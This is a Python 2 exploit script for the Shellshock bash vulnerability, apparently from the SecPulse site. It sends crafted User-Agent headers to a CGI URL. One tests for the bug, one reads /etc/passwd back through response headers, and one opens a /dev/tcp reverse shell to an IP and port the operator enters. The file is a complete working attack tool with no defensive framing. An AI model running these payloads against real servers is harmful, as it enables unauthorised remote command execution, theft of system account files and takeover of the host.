#!/usr/bin/env python
#-*- coding:utf8 -*-

import urllib,httplib
import re,urlparse
from ctypes import *
import sys
reload(sys)
sys.setdefaultencoding = 'utf-8'


def bash_exp(url):

    hostname, urlpath = urlparse.urlsplit(url)[1:3]
    try:
        conn=httplib.HTTPConnection(hostname,timeout=20)
        headers={"User-Agent":'() { :;}; /bin/bash -c "id"'}
        conn.request("GET",urlpath,headers=headers)
        res=conn.getresponse()
        if res and res.status == 500:
            windll.Kernel32.GetStdHandle.restype = c_ulong
            h = windll.Kernel32.GetStdHandle(c_ulong(0xfffffff5))
            windll.Kernel32.SetConsoleTextAttribute(h, 12)
            print "SecPulse Hint:Bash of this site is Vulnerable!"
            windll.Kernel32.SetConsoleTextAttribute(h, 7)

            cat_passwd(hostname,urlpath)

            windll.Kernel32.SetConsoleTextAttribute(h, 10)
            reverseIp = raw_input("Reverse IP & Port Like 255.255.255.1/8080:    ")
            if reverseIp:
                try:
                    conn2=httplib.HTTPConnection(hostname,timeout=20)
                    headers2={"User-Agent":'() { :;}; /bin/bash -i >& /dev/tcp/%s 0>&1' % reverseIp}
                    print "Reversing~"
                    conn2.request("GET",urlpath,headers=headers2)

                except KeyboardInterrupt:
                    print "Process interrupted by user."
                except Exception, e:
                    print e

            else:
                print "Nothing Input,Exiting..."
            windll.Kernel32.SetConsoleTextAttribute(h, 7)
        else:
            print "SecPulse.com Hint:No Bash Vulnerable!"

    except Exception, e:
        print e


def cat_passwd(hostname,urlpath):
    print "cat /etc/passwd :"
    conn3=httplib.HTTPConnection(hostname,timeout=20)
    headers3={"User-Agent":"() { :;}; echo `/bin/cat /etc/passwd`"}
    conn3.request("GET",urlpath,headers=headers3)
    res3=conn3.getresponse()
    res=res3.getheaders()
    for passwdstr in res:
        print passwdstr[0]+':'+passwdstr[1]


if __name__=='__main__':

    if len(sys.argv)<2:
        print "Usage: "+sys.argv[0]+" http://www.secpulse.com/cgi-bin/index.cgi"
        sys.exit(-1)
    else:
        bash_exp(sys.argv[1])
